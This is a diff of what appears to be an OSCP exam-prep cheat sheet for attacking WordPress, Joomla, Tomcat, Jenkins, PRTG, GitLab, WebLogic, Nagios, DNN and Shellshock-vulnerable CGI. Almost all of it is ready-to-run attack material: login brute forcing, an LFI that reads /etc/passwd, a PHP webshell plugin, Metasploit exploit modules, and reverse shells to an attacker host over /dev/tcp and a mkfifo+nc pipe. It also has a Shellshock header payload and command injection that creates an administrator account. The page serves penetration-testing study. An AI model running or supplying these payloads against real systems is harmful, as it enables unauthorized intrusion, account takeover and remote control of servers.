@@ -36,20 +36,20 @@ wpscan --url http://blog.target.local --enumerate
 wpscan --url http://blog.target.local --enumerate u
 
 # Brute force via xmlrpc (faster + often less filtered than wp-login.php)
-wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://blog.target.local
+wpscan --password-attack xmlrpc -t 20 -U $Username -P /usr/share/wordlists/rockyou.txt --url http://blog.target.local
 
 # Plugin version (no auth)
-curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt | grep "Stable tag"
+curl http://$BoxIP/wp-content/plugins/<plugin-name>/readme.txt | grep "Stable tag"
 
 # Directory listing check
-curl http://<target>/wp-content/uploads/    # directory listing enabled? browse subdirs
+curl http://$BoxIP/wp-content/uploads/    # directory listing enabled? browse subdirs
 
 # Plugin LFI (example: mail-masta, CVE-2016-10956)
-curl -s 'http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
+curl -s 'http://$BoxIP/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
 
 # Admin-to-RCE: theme editor
 # Appearance → Theme Editor → select theme → 404.php → inject reverse shell → trigger URL:
-curl 'http://<target>/wp-content/themes/<theme>/404.php'
+curl 'http://$BoxIP/wp-content/themes/<theme>/404.php'
 
 # Admin-to-RCE: plugin zip upload (bypasses the loopback-check that reverts theme edits)
 mkdir /tmp/shell && cat > /tmp/shell/shell.php << 'EOF'
@@ -61,7 +61,7 @@ system($_GET['cmd']);
 EOF
 cd /tmp && zip -r shell.zip shell
 # Plugins → Add New → Upload Plugin → Install → Activate
-# Webshell fires on every page: http://<target>/?cmd=id
+# Webshell fires on every page: http://$BoxIP/?cmd=id
 ```
 
 See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.2]], [[Web Applications#WordPress|existing WordPress entry]].
@@ -74,19 +74,19 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Version from README.txt (always present on default installs)
-curl -s http://<target>/README.txt | head -n 4
+curl -s http://$BoxIP/README.txt | head -n 4
 # Format: "Joomla! 3.10 version history" → 3.10.0
 
 # Version exact: manifests file
-curl -s http://<target>/administrator/manifests/files/joomla.xml | grep '<version>'
+curl -s http://$BoxIP/administrator/manifests/files/joomla.xml | grep '<version>'
 
 # Login brute force
 git clone https://github.com/ajnik/joomla-bruteforce.git
-python3 joomla-brute.py -u http://<target> -w /usr/share/wordlists/rockyou.txt -usr admin
+python3 joomla-brute.py -u http://$BoxIP -w /usr/share/wordlists/rockyou.txt -usr admin
 
 # Admin-to-RCE: template editor
 # Extensions → Templates → Templates → select theme → edit error.php → inject reverse shell
-# Trigger: http://<target>/templates/<theme>/error.php
+# Trigger: http://$BoxIP/templates/<theme>/error.php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
 ```
 
@@ -100,11 +100,11 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Version from CHANGELOG.txt
-curl -s http://<target>/CHANGELOG.txt | grep -m1 "Drupal"
+curl -s http://$BoxIP/CHANGELOG.txt | grep -m1 "Drupal"
 # Drupal 7.30, 2014-07-24
 
 # Version on Drupal 8+
-curl -s http://<target>/core/CHANGELOG.txt | grep -m1 "Drupal"
+curl -s http://$BoxIP/core/CHANGELOG.txt | grep -m1 "Drupal"
 
 # Admin-to-RCE: PHP Filter module (Drupal 7 only, disabled by default)
 # Extend → find PHP Filter → Enable
@@ -123,12 +123,12 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Version: error page, documentation link, or Nmap banner
-curl http://<target>:8080/nonexistent   # check response body for version
+curl http://$BoxIP:8080/nonexistent   # check response body for version
 
 # Manager login brute force (MSF)
 msfconsole -q
 use auxiliary/scanner/http/tomcat_mgr_login
-set RHOSTS <target>
+set RHOSTS $BoxIP
 set RPORT 8080        # or 8180
 set VHOST <vhost>
 set STOP_ON_SUCCESS true
@@ -142,12 +142,12 @@ nc -nvlp PWNPO
 
 # CGI injection — CVE-2019-0232 (Windows, Tomcat < 9.0.17)
 # Fuzz for .bat CGI scripts
-ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target>:8080/cgi/FUZZ.bat
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://$BoxIP:8080/cgi/FUZZ.bat
 # URL-encode a command injection (& + path)
-curl 'http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
+curl 'http://$BoxIP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
 # MSF exploit
 use exploit/windows/http/tomcat_cgi_cmdlineargs
-set RHOSTS <target>
+set RHOSTS $BoxIP
 set TARGETURI /cgi/cmd.bat
 set LHOST tun0
 set FORCEEXPLOIT true
@@ -163,7 +163,7 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 ## Jenkins
 
 ```bash
-# Version: bottom-right of any page after logging in (admin:admin default)
+# Version: bottom-right of any page after logging in ($Username:$Password default)
 
 # Groovy Script Console RCE: Manage Jenkins → Script Console
 # Paste:
@@ -203,7 +203,7 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Version: Nmap banner on port 8080, or bottom-left of web UI
-# Default creds: prtgadmin:Password123
+# Default creds: prtgadmin:$Password
 
 # Notification Execute Program RCE:
 # 1. Setup → Account Settings → Notifications → Add new notification
@@ -211,8 +211,8 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 # 3. Program File: "Demo exe notification - outfile.ps1"
 # 4. Parameter: test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
 # 5. Save → select notification → click bell (test) → user created
-crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
-evil-winrm -i <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+crackmapexec smb $BoxIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+evil-winrm -i $BoxIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
 type C:\Users\Administrator\Desktop\flag.txt
 ```
 
@@ -238,7 +238,7 @@ searchsploit -m ruby/webapps/49821.sh
 searchsploit -m ruby/webapps/49951.py
 nc -nvlp 9001
 python3 49951.py -t http://gitlab.target.local:8081 \
-  -u <user> -p <pass> \
+  -u $Username -p $Password \
   -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP 9001 >/tmp/f'
 ```
 
@@ -252,13 +252,13 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Fuzz for CGI scripts
-gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+gobuster dir -u http://$BoxIP/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 
 # Test (read /etc/passwd)
-curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<target>/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://$BoxIP/cgi-bin/access.cgi
 
 # Reverse shell
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://<target>/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://$BoxIP/cgi-bin/access.cgi
 ```
 
 Payload anatomy: `() { :; };` defines a dummy bash function. Bash re-evaluates exported function definitions from environment variables, the `;` after `}` injects a second command into that re-evaluation context.
@@ -292,14 +292,14 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 # IIS leaks 8.3 short filenames via HTTP status code differences
 git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
 cd IIS-ShortName-Scanner/release/
-java -jar iis_shortname_scanner.jar 0 5 http://<target>/
+java -jar iis_shortname_scanner.jar 0 5 http://$BoxIP/
 # Output example: TRANSF~1.ASP (first 6 chars of full name)
 
 # Build wordlist from the 6-char prefix
 egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
 
 # Brute force full filename
-gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp
+gobuster dir -u http://$BoxIP/ -w /tmp/list.txt -x .aspx,.asp
 ```
 
 See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.14]].
@@ -327,11 +327,11 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Read source code to find the privileged parameter not shown in the UI form
-scp root@<target>:/opt/asset-manager/app.py .   # or SSH + cat
+scp root@$BoxIP:/opt/asset-manager/app.py .   # or SSH + cat
 
 # Look for: if user['active'] == True: (or similar flag)
 # Submit the hidden parameter in the POST body alongside normal login fields
-curl -X POST http://<target>/login -d 'username=test&password=test&active=1'
+curl -X POST http://$BoxIP/login -d 'username=test&password=test&active=1'
 ```
 
 See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.16]].
@@ -383,11 +383,11 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 
 ```bash
 # Version: Nmap banner on port 7001 (T3 protocol)
-nmap -A -p 7001 <target>
+nmap -A -p 7001 $BoxIP
 
 # MSF RCE
 use multi/http/weblogic_admin_handle_rce
-set RHOSTS <target>
+set RHOSTS $BoxIP
 set SRVHOST PWNIP
 set LHOST PWNIP
 exploit
@@ -407,7 +407,7 @@ See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.
 # Authenticated RCE (Nagios XI 5.7.X)
 searchsploit -m php/webapps/49422.py
 nc -nvlp PWNPO &
-python3 49422.py http://<target> <user> '<pass>' PWNIP PWNPO &
+python3 49422.py http://$BoxIP $Username '$Password' PWNIP PWNPO &
 # Shell as www-data → cat flag.txt
 ```
 
@@ -453,7 +453,7 @@ Admin → Extensions → File Extension Management → add: asp,aspx,exe,SAVE
 ```
 -- Step 3: Upload webshell (newcmdasp.asp or similar ASP webshell)
 Admin → File Management → Upload Files
-Click uploaded file → webshell accessible at /Portals/0/<filename>
+Click uploaded file → webshell accessible at /Portals/0/$BoxDir
 ```
 
 **Privilege escalation from IIS AppPool context:**
@@ -491,7 +491,7 @@ DefaultPassword field in secretsdump output contains DPAPI-protected auto-login 
 If the DNN installation is on a volume shared via NFS (check with `showmount -e TARGET`), the database credentials live at:
 
 ```
-/SHARE/DNN/web.config → <username>Administrator</username> + <value>PASSWORD</value>
+/SHARE/DNN/web.config → $UsernameAdministrator</username> + <value>PASSWORD</value>
 ```
 
 See [[27. Assembling the Pieces|AEN.7]] for the full chain example.
@@ -508,3 +508,14 @@ See [[27. Assembling the Pieces|AEN.7]] for the full chain example.
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
